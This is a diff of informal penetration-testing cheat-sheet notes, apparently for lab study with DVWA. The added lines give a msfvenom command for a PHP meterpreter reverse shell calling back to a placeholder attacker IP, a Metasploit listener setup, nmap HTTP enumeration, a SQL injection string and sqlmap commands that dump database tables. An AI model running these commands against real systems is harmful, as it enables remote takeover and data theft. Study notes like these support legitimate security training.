@@ -26,12 +26,12 @@ Steganography with snow tools
 snow -C -m "My password of my account is 12345!!" -p "p4ssWd" matteo.txt secret.txt
 snow -C -p "p4ssWd" secret.txt
 
-ssh username@192.168.0.1
-sudo -i
-cd /
-locate text.txt
-or u can use find 
-cat folder1/folder2/folder3/text.txt
+MSFCONSOLE WITH METERPRETER SESSION PAYLOAD PHP with MSFVENOM
+msfvenom -p php/meterpreter/reverse_tcp LHOST= attackerip LPORT=4444 -f raw >exploit1.php
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST ATTACKERIP
+
 
 
 HOW TO BRUTE FORCE  WORDPRESS ACCOUNT 
@@ -60,5 +60,19 @@ tcp.flag/syn == 1 and tcp.flags.ack == 0
 or go to statistics --> ipv4 addresses > Source and Destinations > Display filter paste tcp.flag/syn == 1 and tcp.flags.ack == 0
 how to identify total number of attacking machine
 the same in statistics but look at the total number of machine with high packet traffics
+
+
+Search with nmap for HTTP vuln 
+nmap -sV --script=http-enum ip address
+in dvwa or page try to input parameters with some sql injection like 1 or 1=1 #
+in burp save a copy in a txt file
+ HOW TO USE SQL MAP IF WE HAVE A FILE 
+sqlmap -r file.txt --dbs
+sqlmap -r file.txt -D databasename --tables
+sqlmap -r file.txt -D databasename -T tablename --columns
+sqlmap -r file.txt -D databasename -T tablename --dump-all
+u can find for example user and other stuff
+
+
 
 
